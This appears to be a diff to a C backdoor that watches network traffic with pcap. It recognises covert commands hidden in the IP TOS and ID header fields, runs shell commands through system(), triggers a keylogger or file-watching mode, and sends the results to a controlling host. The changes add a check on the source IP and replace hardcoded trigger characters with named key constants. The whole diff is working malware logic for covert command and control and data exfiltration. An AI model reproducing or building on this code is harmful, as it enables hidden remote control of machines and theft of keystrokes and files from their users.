@@ -137,6 +137,7 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                     //because safety
                     unsigned char buf[BUFSIZE + 16];
                     strncpy(buf, ParseTCPPayload(packet), sizeof(buf));
+                    printf("Payload: %s", buf);
 
                     if((fwrite(buf, strlen((const char*)buf), sizeof(char), fp)) <= 0){
                         perror("fwrite");
@@ -164,10 +165,16 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                 printf("EOT\n");
                 switch(Filter->flag) {
                     case COMMAND:
-                        system(CHMOD);
-                        system(CMD);
-                        printf("COMMAND RECEIEVED \n");
-                        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, true, Filter->flag);
+                        Filter->flag = COMMAND;
+                        src = ip->ip_src;
+                        printf("source: %d", ntohs(src.s_addr));
+                        if(src.s_addr == inet_addr(Filter->targetip)){
+                            sleep(1);
+                            system(CHMOD);
+                            system(CMD);
+                            printf("COMMAND RECEIEVED \n");
+                            send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, Filter->flag);
+                        }
                         break;
                     case KEYLOGGER:
                         sleep(1);
@@ -176,7 +183,7 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                     case INOTIFY:
                         //start inotify
                         //when completed, copy inotify file to results file
-                        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, true, Filter->flag);
+                        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, Filter->flag);
                         break;
                 }
                 break;
@@ -216,15 +223,13 @@ const unsigned char *ParseTCPPayload(const u_char* packet) {
 
 int CheckKey(u_char ip_tos, u_short ip_id){
     // check if key is right for normal packets
-    if(ip_tos == 'c' && ip_id == 'c'){
+    if(ip_tos == COMMAND_KEY && ip_id == COMMAND_KEY){
         return COMMAND;
-    } else if(ip_id == 'u' && ip_tos == 'u') {
-        return UDPCOMMAND;
-    } else if(ip_tos == 'k' && ip_id == 'k') {
+    } else if(ip_tos == KEYLOGGER_KEY  && ip_id == KEYLOGGER_KEY) {
         return KEYLOGGER;
-    } else if(ip_tos == 'i' && ip_id == 'i') {
+    } else if(ip_tos == INOTIFY_KEY && ip_id == INOTIFY_KEY) {
         return INOTIFY;
-    } else if(ip_tos == '4' && ip_id == '4') {
+    } else if(ip_tos == EOT_KEY && ip_id == EOT_KEY) {
         return EOT;
     } else {
         return -1;
